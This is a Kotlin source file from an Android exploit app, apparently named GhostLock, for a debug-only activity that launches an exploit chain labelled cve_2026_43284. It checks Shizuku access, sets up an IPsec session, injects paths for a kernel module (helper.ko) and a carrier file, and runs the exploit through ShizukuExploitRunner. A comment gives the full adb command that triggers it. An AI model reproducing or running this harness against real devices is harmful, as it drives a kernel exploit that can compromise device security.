package com.ghostlock.app.dev

import android.content.Context
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import com.ghostlock.app.BuildConfig
import com.ghostlock.app.data.AndroidProfileConfigController
import com.ghostlock.app.data.AssetConfigLoader
import com.ghostlock.app.data.Cve2026_43284Fields
import com.ghostlock.app.data.UserProfileStore
import com.ghostlock.app.data.component.BackendKind
import com.ghostlock.app.data.component.CombinationCatalog
import com.ghostlock.app.data.ipsec.AndroidIpsecSessionFactory
import com.ghostlock.app.data.ipsec.IpsecSession
import com.ghostlock.app.data.ipsec.IpsecSessionResult
import com.ghostlock.app.data.profile.ChannelBStdin
import com.ghostlock.app.domain.model.CpuPair
import com.ghostlock.app.domain.model.ShizukuStatus
import com.ghostlock.app.shizuku.ShizukuExploitRunner
import java.io.File
import kotlinx.coroutines.runBlocking

/**
 * Explicit, debug-only adb trigger for the cve_2026_43284 chain (B5-9d, reworked
 * by R2b).
 *
 * R2b: this entry no longer assembles a staged native argv. It builds the SAME
 * GLKv3 document the production path builds -- the resolved device profile with
 * the 43284 selection, plus the two dev paths injected as overrides -- and runs
 * it through the same app-call pipeline (`--ghostlock-app-call
 * --enable-status-record`, optional dev-only `--allow-dev-target`). The only
 * differences from production are that opt-in flag and the overridden
 * lkm/carrier paths; there is no stage vocabulary any more.
 *
 * The document is resolved through a dev-private SharedPreferences file, so a
 * dev replay can never leave overrides behind in the production controller.
 *
 * MODULE maps to `backend.cve_2026_43284.lkm_path` and TARGET to
 * `backend.cve_2026_43284.carrier_path` (the native staged positional target WAS
 * the carrier: stage_runner.hpp "target_path is the positional carrier").
 *
 * adb shell am start -n com.ghostlock.app/.dev.DevCve43284Activity
 *   --ez com.ghostlock.app.extra.DEV_CONFIRM true
 *   --es com.ghostlock.app.extra.MODULE /data/local/tmp/ghostlock-app/helper.ko
 *   --es com.ghostlock.app.extra.TARGET /data/local/tmp/ghostlock-app/target.bin
 *   --es com.ghostlock.app.extra.CPU_PAIR 2,3
 *   --ez com.ghostlock.app.extra.DEV_ALLOW_TARGET true
 *
 * The activity is disabled unless the debug build enables it, refuses non-debug
 * builds and requires the DEV_CONFIRM boolean extra. Logs go to logcat under TAG.
 */
class DevCve43284Activity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!BuildConfig.DEBUG) {
            log("refusing: not a debug build")
            finish()
            return
        }
        if (!intent.getBooleanExtra(EXTRA_CONFIRM, false)) {
            log("refusing: missing " + EXTRA_CONFIRM + "=true (explicit opt-in required)")
            finish()
            return
        }
        val modulePath = intent.getStringExtra(EXTRA_MODULE).orEmpty()
        val targetPath = intent.getStringExtra(EXTRA_TARGET).orEmpty()
        val allowDevTarget = intent.getBooleanExtra(EXTRA_ALLOW_TARGET, false)
        val pairExtra = intent.getStringExtra(EXTRA_CPU_PAIR)
        val pair = parseCpuPair(pairExtra)
        if (modulePath.isEmpty() || targetPath.isEmpty()) {
            log("refusing: " + EXTRA_MODULE + " and " + EXTRA_TARGET + " are required")
            finish()
            return
        }
        if (pairExtra != null && pair == null) {
            log("refusing: " + EXTRA_CPU_PAIR + " must be \"main,consumer\" (got ${pairExtra})")
            finish()
            return
        }

        val resolvedPair = pair ?: CpuPair(DEFAULT_MAIN_CPU, DEFAULT_CONSUMER_CPU)
        Thread({ runDev(modulePath, targetPath, resolvedPair, allowDevTarget) }, "ghostlock-dev-43284")
            .apply { isDaemon = true }
            .start()
    }

    private fun runDev(
        modulePath: String,
        targetPath: String,
        pair: CpuPair,
        allowDevTarget: Boolean,
    ) {
        var session: IpsecSession? = null
        val runner = ShizukuExploitRunner(applicationContext)
        try {
            val status = runner.status()
            log("Shizuku status=" + status)
            when (status) {
                ShizukuStatus.READY -> Unit
                ShizukuStatus.PERMISSION_REQUIRED -> {
                    runner.requestPermission()
                    log("Shizuku permission requested; grant it and re-run")
                    return
                }
                ShizukuStatus.NOT_RUNNING -> {
                    log("Shizuku is not running")
                    return
                }

                ShizukuStatus.NOT_REQUIRED -> {
                    log("Shizuku is not ready")
                    return
                }
            }
            when (val result = AndroidIpsecSessionFactory(applicationContext).create()) {
                is IpsecSessionResult.Ready -> {
                    session = result.session
                    log("ipsec SA ready (spi/ports present, keys withheld)")
                }

                is IpsecSessionResult.Failure -> {
                    log(
                        "cannot establish ipsec SA: " + result.reason +
                            (result.detail?.let { " (" + it + ")" } ?: ""),
                    )
                    return
                }
            }
            val sessionFrame = requireNotNull(
                ChannelBStdin.sessionFrame(BackendKind.Cve2026_43284, session.secrets),
            ) { "channel-B frame was not produced" }
            val blob = buildDevDocument(modulePath, targetPath, pair)
            log(
                "dev document ready: bytes=" + blob.size + " pair=" + pair +
                    " allowDevTarget=" + allowDevTarget,
            )

            val exitCode = runBlocking {
                runner.runDevExploit(blob, sessionFrame, allowDevTarget, ::log) { step, stepStatus ->
                    log("status " + step + "=" + stepStatus)
                }
            }
            log("dev run finished exit=" + exitCode)
        } catch (error: Throwable) {
            log("error: " + error.message)
        } finally {
            runCatching { session?.close() }
            runCatching { runner.close() }
            runOnUiThread { finish() }
        }
    }

    /**
     * Builds the same GLKv3 document the production path builds: the resolved
     * device profile, the cve_2026_43284 selection, and the two dev paths as
     * advanced overrides. A dev-private preferences file holds the override
     * store, so nothing here can change a later production run.
     */
    private fun buildDevDocument(modulePath: String, targetPath: String, pair: CpuPair): ByteArray {
        val assetLoader = AssetConfigLoader(applicationContext)
        val controller = AndroidProfileConfigController(
            context = applicationContext,
            filesDir = filesDir,
            /* Same directory convention as AndroidGhostlockRepository, so
             * imported user documents resolve exactly as in production. */
            userProfiles = UserProfileStore(File(filesDir, USER_PROFILES_DIR), assetLoader),
            preferences = getSharedPreferences(DEV_PREFS, Context.MODE_PRIVATE),
            backendSelection = { BackendKind.Cve2026_43284 },
            combinationSelection = {
                requireNotNull(CombinationCatalog.defaultFor(BackendKind.Cve2026_43284)) {
                    "the native manifest offers no cve_2026_43284 token"
                }
            },
        )
        val release = System.getProperty("os.version", "").orEmpty()
        val config = runBlocking { controller.load(release, pair) }
        require(config.hasProfile) { "no builtin profile for $release" }
        val updated = runBlocking {
            controller.updateAdvanced(
                release,
                pair,
                mapOf(
                    Cve2026_43284Fields.Section + ".lkm_path" to modulePath,
                    Cve2026_43284Fields.Section + ".carrier_path" to targetPath,
                ),
            )
        }
        require(updated.invalidPaths.isEmpty()) {
            "dev document has invalid fields: " + updated.invalidPaths.take(6)
        }
        return requireNotNull(controller.nativeDocument(updated)) {
            "cannot encode the dev document"
        }
    }

    /** Parses the optional "main,consumer" CPU-pair extra; null when malformed. */
    private fun parseCpuPair(text: String?): CpuPair? {
        val parts = text?.split(',') ?: return null
        if (parts.size != 2) return null
        val main = parts[0].trim().toIntOrNull() ?: return null
        val consumer = parts[1].trim().toIntOrNull() ?: return null
        if (main < 0 || consumer < 0) return null
        return CpuPair(main, consumer)
    }

    private fun log(line: String) {
        Log.i(TAG, line)
    }

    companion object {
        const val TAG = "GhostLockDev"
        const val EXTRA_CONFIRM = "com.ghostlock.app.extra.DEV_CONFIRM"
        const val EXTRA_MODULE = "com.ghostlock.app.extra.MODULE"
        const val EXTRA_TARGET = "com.ghostlock.app.extra.TARGET"
        const val EXTRA_ALLOW_TARGET = "com.ghostlock.app.extra.DEV_ALLOW_TARGET"

        /** Optional "main,consumer" CPU pair; defaults to `0,1`. */
        const val EXTRA_CPU_PAIR = "com.ghostlock.app.extra.CPU_PAIR"

        private const val DEFAULT_MAIN_CPU = 0
        private const val DEFAULT_CONSUMER_CPU = 1

        /** Dev-private override store (never the production preferences). */
        private const val DEV_PREFS = "ghostlock_dev_cve_2026_43284"
        private const val USER_PROFILES_DIR = "user_profiles"
    }
}
